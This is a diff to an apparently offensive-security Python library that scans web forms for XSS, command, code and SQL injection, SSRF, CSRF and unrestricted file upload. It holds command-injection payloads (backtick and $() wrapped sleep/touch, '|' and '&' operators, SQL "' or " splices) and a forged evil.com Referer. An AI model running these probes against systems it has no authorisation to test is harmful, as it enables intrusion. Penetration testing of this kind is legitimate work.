@@ -172,7 +172,7 @@ def setup_ua(usra):
 
 
 
-def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',context_breaker='">',save_to_file=None,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
+def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',context_breaker='">',save_to_file=None,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None,debug=False,mime_type=None):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -232,7 +232,7 @@ def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",replaceb
       if x["name"].strip() not in leave_empty and x["name"].strip() not in dont_send:
        if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
         i=x["name"]
-        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send)
+        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type)
         xss_res=xss_submit(parsed_form,xp,replaceble_parameters,debug=debug,enctype=l1['enctype'])
         if xss_res[0]==True:
           x="parameter: '"+i+"' => [+]Payload was found"
@@ -286,7 +286,9 @@ def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False,enctype
       if int(time.time()-t)>=based_on[1]-2:
        return (True,'')
    except Exception as e:
-    pass
+    if "Read timed out" in str(e):
+     if based_on[0]=="time":
+      return (True,'')
   else:
    try:
      c=requests.post(parsed[0]["action"], data= d,files=fi,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
@@ -298,11 +300,13 @@ def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False,enctype
       if int(time.time()-t)>=based_on[1]-2:
        return (True,'')
    except Exception as e:
-    pass
+    if "Read timed out" in str(e):
+     if based_on[0]=="time":
+      return (True,'')
   return (False,'')
 
 
-def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_extension='png',start_line=None,replaceble_parameters={"phpvalue":((".",""),)},end_line=None,based_on="time",delay=10,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=40,user_agent=None,cookie=None,debug=False):
+def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},code_operator_right='',code_operator_left='',command_operator_right='|',command_operator_left='&',sql_operator_right="or '",sql_operator_left="' or ",file_extension='png',replaceble_parameters={"phpvalue":((".",""),)},based_on="time",delay=10,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=40,user_agent=None,cookie=None,debug=False,mime_type=None):
   '''
    this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -318,16 +322,16 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_
                        "linux":
                                {
                                 "file":
-                                       [" |touch {}.txt&"," &touch {}.txt&",";touch {}.txt;","`touch {}.txt`","$(touch {}.txt)"],
+                                       ["touch {}.txt","`touch {}.txt`","$(touch {}.txt)"],
                                 "time":                            
-                                       [" |sleep {}&"," &sleep {}&",";sleep {};","`sleep {}`","$(sleep {})"]
+                                       ["sleep {}","`sleep {}`","$(sleep {})"]
                                 },
                        "windows":
                                 {
                                  "file":
-                                        [" |copy nul {}.txt&"," &copy nul {}.txt &"],
+                                        ["copy nul {}.txt"],
                                  "time":
-                                        [" |ping -n {} 127.0.0.1&"," &ping -n {} 127.0.0.1 &"]
+                                        ["ping -n {} 127.0.0.1"]
                                 }
                        },
             "code":
@@ -395,11 +399,39 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_
   target_page=u
   xp=""
   based_on_o=based_on
-  if start_line:
-   xp+=start_line
-  inject_type=list(injection.keys())[0]
-  inject_target=injection[inject_type]
-  xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
+  if list(injection.keys())[0] =="command":
+   xp+=command_operator_left
+   inject_type=list(injection.keys())[0]
+   inject_target=injection[inject_type]
+   xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
+   if based_on_o.lower()=="file":
+     based_on=("file",random_string(random.randint(3,10)))
+   else:
+     based_on=("time",int(delay)+2)
+   xp=xp.format(based_on[1])
+   xp+=command_operator_right
+  elif list(injection.keys())[0] =="code":
+   xp+=code_operator_left
+   inject_type=list(injection.keys())[0]
+   inject_target=injection[inject_type]
+   xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
+   if based_on_o.lower()=="file":
+     based_on=("file",random_string(random.randint(3,10)))
+   else:
+     based_on=("time",int(delay))
+   xp=xp.format(based_on[1])
+   xp+=code_operator_right
+  else:
+   xp+=sql_operator_left
+   inject_type=list(injection.keys())[0]
+   inject_target=injection[inject_type]
+   xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
+   if based_on_o.lower()=="file":
+     based_on=("file",random_string(random.randint(3,10)))
+   else:
+     based_on=("time",int(delay))
+   xp=xp.format(based_on[1])
+   xp+=sql_operator_right
   target_page=u
   form_index=-1
   if proxy:
@@ -416,13 +448,6 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_
     print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
    hu=False
   if hu==True:
-   if based_on_o.lower()=="file":
-     based_on=("file",random_string(random.randint(3,10)))
-   else:
-     based_on=("time",int(delay)+2)
-   xp=xp.format(based_on[1])
-   if end_line:
-    xp+=end_line
    for l1 in fom:
     form_index+=1
     lst={}
@@ -443,7 +468,7 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_
        try:
         if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
          i=x["name"]
-         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send)
+         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type)
          _res=rce_submit(parsed_form,xp,based_on,replaceble_parameters,debug=debug,enctype=l1['enctype'])
          if _res[0]==True:
            x="parameter: '"+i+"' => [+] Vulnerable !!"
@@ -582,7 +607,8 @@ def ssrf_check(u,null_byte=False,link="http://www.google.com",signature="<title>
     if (signature in r.text) or (r.status_code==504):
      return (True,r.url)
  except Exception as e:
-    pass
+    if "Read timed out" in str(e):
+     return (True,u.format(l))
  return (False,'')
 
 
@@ -638,7 +664,7 @@ def clickjacking(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False
 
 
 
-def set_requests(u,method="GET",data={},params={},headers={},files={},proxy={},timeout=15):
+def set_requests(u,method="GET",data={},files={},params={},headers={},proxy={},timeout=15):
  s = requests.Session()
  req = requests.Request(method=method ,url=u, headers=headers, data=data, files=files,params=params)
  prep = req.prepare()
@@ -781,15 +807,9 @@ def csrf_filter_tokens(u,proxy=None,timeout=10,user_agent=None,cookie=None):
  return res
 
 
-def set_requests(u,method="GET",data={},files={},params={},headers={},proxy={},timeout=15):
- s = requests.Session()
- req = requests.Request(method=method ,url=u, headers=headers, data=data, files=files,params=params)
- prep = req.prepare()
- prep.url = u
- return s.send(prep, verify=False,proxies=proxy,timeout=timeout)
 
 
-def csrf_forms(u,proxy=None,timeout=10,user_agent=None,cookie=None,file_extension='png',fill_empty=10,referer="http://www.evil.com",leave_empty=[],dont_send=[]):
+def csrf_forms(u,proxy=None,timeout=10,user_agent=None,cookie=None,replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',fill_empty=10,referer="http://www.evil.com",leave_empty=[],dont_send=[],mime_type=None):
  vu=[]
  if not cookie or len(cookie.strip())==0:
   raise Exception("This attack requires authentication !! You need to set a Cookie")
@@ -803,8 +823,13 @@ def csrf_forms(u,proxy=None,timeout=10,user_agent=None,cookie=None,file_extensio
  h.update({"cookie":cookie})
  h.update({"Referer":referer,"Origin":referer.split("://")[0]+"://"+referer.split("://")[1].split("/")[0]})
  for x in v:
-  x=form_filler(x,"","",file_extension=file_extension,auto_fill=fill_empty,leave_empty=leave_empty,dont_send=dont_send)
+  x=form_filler(x,"","",file_extension=file_extension,auto_fill=fill_empty,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type)
   d,f=setup_to_submit(x)
+  for g in d:
+   for y in replaceble_parameters:
+    if x==y:
+     for z in replaceble_parameters[y]:
+      d[g]=d[g].replace(z[0],z[1])
   l=[d[y] for y in d]
   for j in f:
    l.append(f[j][0])
@@ -818,17 +843,23 @@ def csrf_forms(u,proxy=None,timeout=10,user_agent=None,cookie=None,file_extensio
     vu.append(x)
   elif r.status_code==200 and any(i in r.text for i in l):
    vu.append(x)
+   warnings.warn("HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
   elif r.status_code==200 and not any(i in r.text for i in l):
-   warnings.warn("HTTP Status Code: 200 , but we didn't find our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
+   warnings.warn("HTTP Status Code: 200 , but we didn't find any of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
    vu.append(x)
  return vu
 
 
-def file_upload(u,proxy=None,timeout=10,user_agent=None,cookie=None,file_extension='png',fill_empty=10,referer=None,leave_empty=[],dont_send=[],mime_type=None):
+def file_upload(u,proxy=None,timeout=10,user_agent=None,cookie=None,replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',fill_empty=10,referer=None,leave_empty=[],dont_send=[],mime_type=None):
  l=[]
  x=forms_parser(u,proxy=proxy,timeout=timeout,user_agent=user_agent,cookie=cookie)
  fo=get_upload_form(x)
  d,f=setup_to_submit(form_filler(fo,'','',mime_type=mime_type))
+ for x in d:
+   for y in replaceble_parameters:
+    if x==y:
+     for z in replaceble_parameters[y]:
+      d[x]=d[x].replace(z[0],z[1])
  if not referer or len(referer)==0:
   referer=u
  for j in f:
@@ -842,16 +873,19 @@ def file_upload(u,proxy=None,timeout=10,user_agent=None,cookie=None,file_extensi
  if 'application/json' in fo["enctype"]:
     d=json.dumps(d)
  h.update({"cookie":cookie})
- print(fo)
  h.update({"Referer":referer,"Origin":referer.split("://")[0]+"://"+referer.split("://")[1].split("/")[0]})
- r=requests.post(fo["action"],data=d,files=f,proxies=proxy,timeout=timeout,headers=h)
- if all(i in r.text for i in l):
+ try:
+  r=requests.post(fo["action"],data=d,files=f,proxies=proxy,timeout=timeout,headers=h)
+  if all(i in r.text for i in l):
     return True
- elif r.status_code==200 and any(i in r.text for i in l):
+  elif r.status_code==200 and any(i in r.text for i in l):
+   warnings.warn("HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
    return True
- elif r.status_code==200 and not any(i in r.text for i in l):
+  elif r.status_code==200 and not any(i in r.text for i in l):
    warnings.warn("HTTP Status Code: 200 , but we didn't find our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
    return True
+ except:
+  pass
  return False
 
 
